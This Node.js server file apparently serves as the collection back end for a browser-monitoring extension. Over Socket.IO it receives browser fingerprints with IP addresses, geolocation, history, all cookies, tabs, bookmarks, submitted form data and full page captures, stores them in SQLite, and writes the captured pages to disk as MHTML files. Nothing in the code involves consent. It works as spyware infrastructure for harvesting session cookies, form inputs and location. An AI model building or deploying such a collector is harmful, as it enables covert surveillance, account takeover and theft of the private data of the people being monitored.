// Import settings.
var settings = require('./settings.js');

///////////////////////////////////////////////////////////////////////////////
// Intialise server.
///////////////////////////////////////////////////////////////////////////////

// Import node modules.
var fs = require('fs');
var express = require('express');
var app = express();
var http = require('http').createServer(app);
var httpsOptions = {
    key: fs.readFileSync(settings.PRIVATE_KEY_PATH),
    cert: fs.readFileSync(settings.CERTIFICATE_PATH)
};
var https = require('https').createServer(httpsOptions, app);
var io = require('socket.io').listen((settings.SSL_ON) ? https : http,
                                     { log: false });
var ss = require('socket.io-stream');
var db = require('sqlite-wrapper')(settings.DB_PATH);
var webAPI = require('./webAPI.js')(app, db);

// Import event modules.
var events = {
    fingerprint: require('./events/fingerprint.js')(db),
    geoposition: require('./events/geoposition.js')(db),
    bookmark:    require('./events/bookmark.js')(db),
    history:     require('./events/history.js')(db),
    cookie:      require('./events/cookie.js')(db),
    window:      require('./events/window.js')(db),
    tab:         require('./events/tab.js')(db),
    formData:    require('./events/formData.js')(db),
    pageCapture: require('./events/pageCapture.js')(db)
};

// Start server.
if (settings.SSL_ON) {
    https.listen(settings.PORT);
} else {
    http.listen(settings.PORT);
}

///////////////////////////////////////////////////////////////////////////////
// Socket.IO handling.
///////////////////////////////////////////////////////////////////////////////

io.sockets.on('connection', function (socket) {
    // Get browser fingerprint (Table: Fingerprints).
    socket.on('addFingerprint', function (data) {
        var ipAddress = socket.handshake.address.address;
        events.fingerprint.add(data, ipAddress);
    });
    // Get current location (Table: Geopositions).
    socket.on('addGeoposition', function (data) {
        events.geoposition.add(data);
    });
    // Get URL visit(s) (Table: History).
    socket.on('addURL', function (data) {
        events.history.add(data);
    });
    // Get URL removal (Table: History).
    socket.on('removeURL', function (data) {
        events.history.remove(data);
    });
    // Get all cookies (Table: Cookies).
    socket.on('addAllCookies', function (data) {
        events.cookie.addAll(data);
    });
    // Get cookie change (Table: Cookies).
    socket.on('addCookieChange', function (data) {
        events.cookie.change(data);
    });
    // Add window (Table: Windows).
    socket.on('addWindow', function (data) {
        events.window.add(data);
    });
    // Focus window (Table: Windows).
    socket.on('focusWindow', function (data) {
        events.window.focus(data);
    });
    // Remove window (Table: Windows).
    socket.on('removeWindow', function (data) {
        events.window.remove(data);
    });
    // Add all tabs (Tables: Windows, Tabs).
    socket.on('addAllTabs', function (data) {
        events.window.add(data);
        events.tab.addAll(data);
    });
    // Update tab (Table: Tabs).
    socket.on('updateTab', function (data) {
        events.tab.update(data);
    });
    // Focus tab (Table: Tabs).
    socket.on('focusTab', function (data) {
        events.tab.focus(data);
    });
    // Remove tab (Table: Tabs).
    socket.on('removeTab', function (data) {
        events.tab.remove(data);
    });
    // Add bookmark (Table: Bookmarks).
    socket.on('addBookmark', function (data) {
        events.bookmark.add(data);
    });
    // Change bookmark (Table: Bookmarks).
    socket.on('changeBookmark', function (data) {
        events.bookmark.change(data);
    });
    // Remove bookmark (Table: Bookmarks).
    socket.on('removeBookmark', function (data) {
        events.bookmark.remove(data);
    });
    // Add form data (Table: FormData).
    socket.on('addFormData', function (data) {
        events.formData.add(data);
    });
    // Add page capture (Table: PageCaptures).
    ss(socket).on('addPageCapture', function (stream, data) {
        // Add page capture to database.
        events.pageCapture.add(data);
        // Save MHTML file.
        metadata = JSON.parse(data.payload);
        filename = settings.PAGE_CAPTURE_DIR +
                   data.time + '_' + metadata.tabId + '.mhtml';
        fs.mkdir(settings.PAGE_CAPTURE_DIR, function () {
            stream.pipe(fs.createWriteStream(filename));
        });
    });
});

///////////////////////////////////////////////////////////////////////////////
// Database handling.
///////////////////////////////////////////////////////////////////////////////

// Create tables.
for (var event in events) {
    events[event].createTable();
}
